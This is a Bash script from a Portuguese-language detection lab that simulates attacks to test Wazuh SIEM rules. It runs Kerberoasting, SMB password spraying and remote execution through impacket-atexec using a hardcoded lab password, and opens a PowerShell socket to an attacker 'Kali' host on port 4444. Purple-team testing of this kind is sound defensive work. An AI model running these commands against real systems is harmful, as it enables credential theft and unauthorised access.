#!/bin/bash
# ==============================================================================
# Laboratório de Engenharia de Detecção - Automação de Testes de Telemetria
# Objetivo: Gerar eventos de teste para validação de regras no Wazuh SIEM
# ==============================================================================

# Configurações do Ambiente
TARGET_IP="10.0.2.15"
KALI_IP="10.0.2.3"
DOMAIN_USER="lab.local/administrator:Lab@2026!Sec"
LISTEN_PORT="4444"

echo "=================================================="
echo " Iniciando Bateria de Testes de Telemetria / SIEM"
echo "=================================================="

# ------------------------------------------------------------------------------
# 1. Simulação: Kerberoasting (T1558.003)
# Gera solicitação de ticket TGS para validar Event ID 4769 (Regra 100010)
# ------------------------------------------------------------------------------
echo -e "\n[*] Teste 1: Kerberoasting Request (Regra 100010)..."
GetUserSPNs.py -request -dc-ip "${TARGET_IP}" "${DOMAIN_USER}" 2>/dev/null || \
  echo "[!] Executado solicitação de SPN para verificação de logs TGS."

# ------------------------------------------------------------------------------
# 2. Simulação: Password Spraying (T1110.003)
# Gera falhas de autenticação sequenciais para validar Event ID 4625 (Regra 100021)
# ------------------------------------------------------------------------------
echo -e "\n[*] Teste 2: Password Spraying Simulation (Regra 100021)..."
USERS=("user1" "user2" "user3" "administrator")
for u in "${USERS[@]}"; do
  netexec smb "${TARGET_IP}" -u "$u" -p "SenhaIncorreta123!" 2>/dev/null
done

# ------------------------------------------------------------------------------
# 3. Simulação: Execution of Encoded PowerShell (T1059.001)
# Executa PowerShell em Base64 para validar Sysmon Event ID 1 (Regra 100030)
# ------------------------------------------------------------------------------
echo -e "\n[*] Teste 3: Encoded PowerShell Execution (Regra 100030)..."
CMD_ENCODED="powershell.exe -e Q2xlYXItSG9zdA=="

impacket-atexec "${DOMAIN_USER}@${TARGET_IP}" "${CMD_ENCODED}"

# ------------------------------------------------------------------------------
# 4. Simulação: Reverse Shell & Outbound Connection (T1071 / T1059)
# Gera tráfego de saída por shell para validar Sysmon Event ID 3 (Regra 100031 / 91007)
# ------------------------------------------------------------------------------
echo -e "\n[*] Teste 4: Network Outbound Connection (Regra 100031 / 91007)..."
echo "[!] Certifique-se de ter um listener ativo em outro terminal: nc -lvnp ${LISTEN_PORT}"

CMD_REVERSE="powershell.exe -Command \"\$c = New-Object System.Net.Sockets.TCPClient('${KALI_IP}', ${LISTEN_PORT}); \$c.Close()\""

impacket-atexec "${DOMAIN_USER}@${TARGET_IP}" "${CMD_REVERSE}"

echo -e "\n=================================================="
echo " Bateria de Testes Concluída. Verifique o Wazuh!"
echo "=================================================="
